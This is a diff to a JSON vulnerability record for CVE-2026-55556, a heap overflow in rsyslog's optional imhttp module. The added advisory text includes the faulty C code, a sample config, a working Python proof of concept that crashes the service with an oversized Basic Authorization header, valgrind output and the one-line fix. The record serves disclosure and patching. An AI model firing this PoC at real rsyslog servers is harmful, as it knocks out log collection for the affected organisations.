@@ -1,13 +1,13 @@
 {
   "schema_version": "1.8.0",
   "id": "DHI-xwvt-zdna-ztgc-cspy",
-  "modified": "2026-11-11T20:50:42Z",
+  "modified": "2026-11-23T23:57:27Z",
   "published": "2026-11-11T20:50:42Z",
   "upstream": [
     "CVE-2026-55556"
   ],
-  "summary": "Rsyslog is a rocket-fast system for log processing. From 8.2110.0 until 8.2604.0, the optional imhttp module's…",
-  "details": "Rsyslog is a rocket-fast system for log processing. From 8.2110.0 until 8.2604.0, the optional imhttp module's parse_auth_header function in contrib/imhttp/imhttp.c allocates a zero-byte heap buffer with calloc(0, len) when an HTTP Basic Authorization value exceeds its fixed work buffer, then passes that pointer to apr_base64_decode. An unauthenticated remote attacker can send an oversized encoded credential to an imhttp endpoint configured for Basic Authentication, causing decoded data to overwrite adjacent heap memory before credential validation. Deployments that do not install, load, and use imhttp with Basic Authentication are not affected. The demonstrated impact is a process crash that interrupts log collection, and code execution has not been demonstrated. This issue is fixed in version 8.2604.0.",
+  "summary": "### Summary",
+  "details": "### Summary\r\n\r\nHeap buffer overflow in the optional `imhttp module` allows an unauthenticated remote attacker to crash rsyslog if `imhttp` is installed and activated with a single HTTP request. The bug is in `parse_auth_header()` which calls `calloc(0, len)` (introduced in commit [`a8b8d6c`](https://github.com/rsyslog/rsyslog/commit/a8b8d6c)) and then writes the full decoded Authorization header into that zero-length allocation. \r\nDefault rsyslog installations that do not load the imhttp module are not affected. This usually requires installing the necessary package and configuring rsyslog to actually use `imhttp`.\r\n\r\nThe rsyslog team does not know of any distribution where imhttp is active by default.\r\n\r\n## Affected Configurations\r\n\r\nThis vulnerability affects rsyslog deployments that meet all of the following conditions:\r\n- The rsyslog build includes the optional contrib/imhttp module\r\n- The imhttp module is installed on the system in question\r\n- The imhttp module is explicitly loaded in the rsyslog configuration\r\n- HTTP Basic Authentication is configured for an imhttp endpoint\r\n\r\nDownstream packaging varies, imhttp may not be shipped at all, packaged separately, or present but not loaded. Users should verify whether imhttp is both installed and explicitly loaded in their configuration.\r\n\r\n### Details\r\n\r\n`contrib/imhttp/imhttp.c` `parse_auth_header():` line 705:\r\n```\r\nconst char *src = auth_header + 6;\r\nsize_t len = apr_base64_decode_len((const char *)src);\r\nauth->pworkbuf = auth->workbuf;\r\nif (len > sizeof(auth->workbuf)) {\r\n   auth->pworkbuf = calloc(0, len);   // BUG: allocates 0 bytes, should be calloc(1, len)\r\n   auth->workbuf_len = len;\r\n}\r\n// ...\r\nlen = apr_base64_decode(auth->pworkbuf, src);  // writes up to len bytes into 0-byte allocation\r\n```\r\n\r\nlen is derived from the attacker-supplied Base64 credential in the Authorization: Basic header. `calloc(0, n)` returns a non-NULL pointer to a zero-length allocation under glibc. The `apr_base64_decode` call then writes the full decoded output past the end of that allocation into adjacent heap memory.\r\n\r\nThe overflow fires before any credential validation so authentication is not required.\r\n\r\n### PoC\r\n\r\nrsyslog config with imhttp enabled:\r\n\r\n```\r\nmodule(load=\"imhttp\" ports=\"8080\" documentroot=\"/tmp/rsyslog-docroot\")\r\ninput(type=\"imhttp\" endpoint=\"/logs\" ruleset=\"r\" basicauthfile=\"/tmp/htpasswd\")\r\nruleset(name=\"r\") { action(type=\"omfile\" file=\"/tmp/out.log\") }\r\n```\r\nPython poc:\r\n\r\n```\r\nimport base64, socket, sys\r\nhost = sys.argv[1] if len(sys.argv) > 1 else \"127.0.0.1\"\r\nport = int(sys.argv[2]) if len(sys.argv) > 2 else 8080\r\npayload = b\"A\" * 10000 + b\":\" + b\"x\"\r\nb64 = base64.b64encode(payload).decode()\r\nreq = f\"POST /logs HTTP/1.1\\r\\nHost: {host}\\r\\nAuthorization: Basic {b64}\\r\\nContent-Length: 4\\r\\nConnection: close\\r\\n\\r\\ntest\"\r\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\ns.settimeout(5)\r\ns.connect((host, port))\r\ns.sendall(req.encode())\r\nprint(s.recv(512).decode(errors=\"replace\").split(\"\\r\\n\")[0])\r\ns.close()\r\n```\r\n#### Valgrind Output\r\n\r\nTested on rsyslog 8.2604.0 / Ubuntu 24.04 / glibc 2.39 with `valgrind --tool=memcheck --error-exitcode=1`:\r\n ```\r\n Invalid write of size 1\r\n     at 0x...: apr_base64_decode_binary (libaprutil-1.so.0.6.3)\r\n     by 0x...: apr_base64_decode (libaprutil-1.so.0.6.3)\r\n     by 0x...: parse_auth_header (imhttp.c:708)\r\n     by 0x...: authorize (imhttp.c:775)\r\n     by 0x...: basicAuthHandler (imhttp.c:809)\r\n\r\n   Address 0x60bae60 is 0 bytes after a block of size 0 alloc'd\r\n     at 0x...: calloc (vg_replace_malloc.c)\r\n     by 0x...: parse_auth_header (imhttp.c:705)\r\n\r\n  valgrind: m_mallocfree.c:304 Assertion 'bszB_lo == bszB_hi' failed.\r\n```\r\n\r\n### Impact\r\n\r\nOn affected configurations, a remote unauthenticated attacker can send a single crafted HTTP request to an imhttp Basic Auth endpoint and crash the rsyslog process, stopping all log collection. The demonstrated impact is process availability (denial of service). Code execution has not been demonstrated.\r\n\r\n### Fix\r\n One character change:\r\n```\r\n  - auth->pworkbuf = calloc(0, len);\r\n  + auth->pworkbuf = calloc(1, len);\r\n```\r\nThis is the minimal fix suitable for downstream backports to affected older trees. Upstream addressed this through broader imhttp parser and authentication hardening that removed the unsafe dynamic Basic Auth buffer entirely.\r\n\r\n",
   "severity": [
     {
       "type": "CVSS_V4",
@@ -21,6 +21,16 @@
         "name": "rsyslog",
         "purl": "pkg:apk/dhi/rsyslog"
       },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "8.2604.0-r0"
+            }
+          ]
+        }
+      ],
       "versions": [
         "8.2604.0-r0",
         "8.2604.0-r1",
@@ -39,7 +49,7 @@
     },
     {
       "type": "ADVISORY",
-      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-55556"
+      "url": "https://github.com/rsyslog/rsyslog/security/advisories/GHSA-947w-69ph-mc2r"
     },
     {
       "type": "ADVISORY",
@@ -48,6 +58,10 @@
     {
       "type": "ADVISORY",
       "url": "https://security-tracker.debian.org/tracker/CVE-2026-55556"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-55556"
     },
     {
       "type": "ADVISORY",
